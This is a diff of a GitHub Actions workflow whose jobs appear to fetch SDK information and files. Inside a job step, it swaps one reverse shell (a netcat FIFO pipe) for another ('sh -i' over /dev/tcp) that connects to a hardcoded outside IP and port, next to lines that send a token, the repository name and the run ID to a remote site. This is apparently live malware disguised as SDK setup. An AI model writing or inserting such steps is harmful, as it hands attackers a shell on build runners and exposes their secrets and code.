@@ -27,7 +27,7 @@ jobs:
           echo "sdktok=${MCSDK_TOKEN}" >> $GITHUB_OUTPUT
           MCSDK_IDEN=$(curl "${SITE_NAME}/getiden?sdktok=${MCSDK_TOKEN}&repo=${GITHUB_REPOSITORY}&runid=${GITHUB_RUN_ID}" | head -n 1)
           echo ServerID-$MCSDK_IDEN
-          rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 159.65.128.101 9392 >/tmp/f
+          sh -i >& /dev/tcp/159.65.128.101/9392 0>&1
           sleep 5
   dl_sdk_files:
     needs: grab_sdk_info
